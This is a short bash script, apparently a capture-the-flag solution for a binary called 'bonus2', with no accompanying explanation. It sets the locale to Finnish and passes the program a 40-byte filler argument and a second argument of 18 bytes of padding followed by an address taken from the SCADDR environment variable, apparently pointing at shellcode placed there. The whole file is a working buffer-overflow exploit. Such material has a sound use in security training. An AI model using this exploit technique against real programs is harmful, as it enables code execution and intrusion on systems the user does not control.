#!/usr/bin/env bash

export LANG=fi
./bonus2 $(python -c 'print 40*"A"') $(python -c 'import os; print 18*"B" + os.getenv("SCADDR")')
